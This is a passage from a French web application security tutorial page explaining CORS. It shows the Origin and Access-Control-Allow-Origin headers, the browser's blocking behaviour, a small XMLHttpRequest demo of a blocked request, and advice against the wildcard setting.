</code></pre><ul><li><p>Le serveur recoit la requete et peut contrôler la présence de Origin s&rsquo;il s&rsquo;attend à de telles requêtes via script</p></li><li><p>Le serveur possède un certain nombre de domaine autorisés à le contacter par script et potentiellement tous (*)</p></li><li><p>Le serveur peut bloquer la requête si elle ne correspond pas à ses domaines autorisés</p></li><li><p>Si le serveur choisit de répondre et qu&rsquo;il est configuré pour, il ajoute un ou plusieurs entêtes Access-Control-Allow-Origin :</p></li></ul><pre><code>Access-Control-Allow-Origin: https://localhost:8443
Access-Control-Allow-Origin: http://localhost:8080
</code></pre><ul><li>S&rsquo;il accepte n&rsquo;importe quel requête issue d&rsquo;un script :</li></ul><pre><code>Access-Control-Allow-Origin: *
</code></pre><ul><li>Le navigateur lit la réponse du serveur</li><li>Si elle ne contient pas d&rsquo;entête Access-Control-Allow-Origin ou qu&rsquo;aucun entête Access-Control-Allow-Origin ne correspond au domaine source, le navigateur ne retourne rien au script. <em>Le script ne fait pas la difference entre un echec de connexion et une erreur cors</em></li></ul><p>Gestion des erreurs :</p><ul><li>Pour debugger, la console du navigateur vous prévient que la réponse a été bloquée</li></ul><p>Test :</p><pre><code class=language-html>&lt;script&gt;
		var testCors = function () {
			var req = new XMLHttpRequest()
			req.open('GET', 'https://insee.fr/fr/accueil', false);
			req.send();
		}
&lt;script&gt;
&lt;button onClick=&quot;testCors();&quot;&gt;Test CORS KO&lt;/button&gt;
</code></pre><script>var testCors=function(){var e=new XMLHttpRequest;e.open("GET","https://insee.fr/fr/accueil",!1),e.send()}</script><p><button onclick=testCors()>Test CORS KO</button></p><ul><li><p>Attention à l&rsquo;autorisation globale (elle peut parfois être nécessaire cependant) : <code>Access-Control-Allow-Origin: *</code></p></li><li><p>L&rsquo;idéal est de controler côté serveur l&rsquo;entete &ldquo;Origin&rdquo; et de personnaliser l&rsquo;entete &ldquo;Access-Control-Allow-Origin&rdquo; si on accepte</p></li><li><p>Le détails complet de CORS ici : https://developer.mozilla.org/fr/docs/Web/HTTP/CORS</p></li><li><p>Il faut garder à l&rsquo;esprit que CORS est une sécurité <em>côté client</em> pour l&rsquo;empécher de faire n&rsquo;importe quoi malgré lui : fournir à un script une information que le serveur n&rsquo;a pas prévu d&rsquo;être utilisée par un script.</p></li></ul><div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between"></div><div class="docs-navigation d-flex justify-content-between"><a href=/docs/failles/sql/><div class="card my-1"><div class="card-body py-2">&larr; Injections de code (serveur)</div></div></a><a class=ms-auto href=/docs/https/fonctionnement/><div class="card my-1"><div class="card-body py-2">Fontionnement de https &rarr;</div></div></a></div></main></div></div></div><footer class="footer text-muted"><div class=container-xxl><div class=row><div class="col-lg-8 order-last order-lg-first"><ul class=list-inline><li class=list-inline-item>Powered by Github-pages, <a class=text-muted href=https://gohugo.io/>Hugo</a>, and <a class=text-muted href=https://getdoks.org/>Doks</a></li></ul></div><div class="col-lg-8 order-first order-lg-last text-lg-end"><ul class=list-inline></ul></div></div></div></footer><script src=/js/bootstrap.min.f93d87ed312fd94eae9a720e5988a3bd322bcdd099518866fc5668e18610cca0077fc356b3edfc727dedf5f773dab0a6d87a870e4b616595e76381163dd5a730.js integrity="sha512-+T2H7TEv2U6umnIOWYijvTIrzdCZUYhm/FZo4YYQzKAHf8NWs+38cn3t9fdz2rCm2HqHDkthZZXnY4EWPdWnMA==" crossorigin=anonymous defer></script>
<script src=/js/highlight.min.537e57b5cd767e9b03563e3c2d8db2bb71516fb92afdadec7dbadb99c3a2710479044278bfeaa670bf89dd37224ed7e73d319d5e7819b6293907ddabd61bfd77.js integrity="sha512-U35Xtc12fpsDVj48LY2yu3FRb7kq/a3sfbrbmcOicQR5BEJ4v+qmcL+J3TciTtfnPTGdXngZtik5B92r1hv9dw==" crossorigin=anonymous defer></script>
<script src=/js/vendor/katex/dist/katex.min.93253b59f879e8b8bf4ef8eec49737249299a1cc8b9c25eb1b0c94ae722f3bc470677d56dfdfcc838ccc904ee3ebcc46a5336495f3b1d7fdbb182f3e6b952390.js integrity="sha512-kyU7Wfh56Li/TvjuxJc3JJKZocyLnCXrGwyUrnIvO8RwZ31W39/Mg4zMkE7j68xGpTNklfOx1/27GC8+a5UjkA==" crossorigin=anonymous defer></script>
<script src=/js/vendor/katex/dist/contrib/auto-render.min.b688a23169501c711300d4bdb5ae40c52ee8976f722fbf3871eb709a51db2ea5d7bf51eaef0e82af7542d973d2f681d9c46b70b72d902601642a15af9b9ce80d.js integrity="sha512-toiiMWlQHHETANS9ta5AxS7ol29yL784cetwmlHbLqXXv1Hq7w6Cr3VC2XPS9oHZxGtwty2QJgFkKhWvm5zoDQ==" crossorigin=anonymous defer></script>
<script src=/main.min.b8e7e565bd2186f67f57d2c5d9680f67abbb2a977ff20ad27eb51f5a7b9071fdec7b71a5e964a41a38fb59cb12d43b76e0b3ac8247cb7063bb73efc06a9ac529.js integrity="sha512-uOflZb0hhvZ/V9LF2WgPZ6u7Kpd/8grSfrUfWnuQcf3se3Gl6WSkGjj7WcsS1Dt24LOsgkfLcGO7c+/AaprFKQ==" crossorigin=anonymous defer></script>
<script src=https://securite-applicative.dufau.re/index.min.0f0b3f3f83453efa1b4b919b620b2d44e095242263bcc9a23102a09f1c0f02caa5b5a8abc2f58245e05ffb26c0dd7e5c48691609cc182d5ae59129ba6b9b6a95.js integrity="sha512-Dws/P4NFPvobS5GbYgstROCVJCJjvMmiMQKgnxwPAsqltairwvWCReBf+ybA3X5cSGkWCcwYLVrlkSm6a5tqlQ==" crossorigin=anonymous defer></script></body></html>